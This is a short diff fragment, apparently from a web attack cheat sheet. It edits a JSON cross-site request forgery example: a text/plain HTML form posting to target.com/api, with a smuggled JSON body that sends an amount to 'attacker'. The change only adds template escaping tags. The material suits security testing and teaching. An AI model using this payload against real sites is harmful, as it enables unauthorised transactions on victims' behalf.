@@ -48,7 +48,7 @@ HTML form auto-submit:
 <json_csrf>
 For JSON endpoints:
 <form enctype="text/plain" action="https://target.com/api">
-  <input name='{"amount":1000,"to":"attacker","ignore":"' value='"}'>
+  <input name='{% raw %}{"amount":1000,"to":"attacker","ignore":"{% endraw %}' value='"}'>
 </form>
 </json_csrf>
 
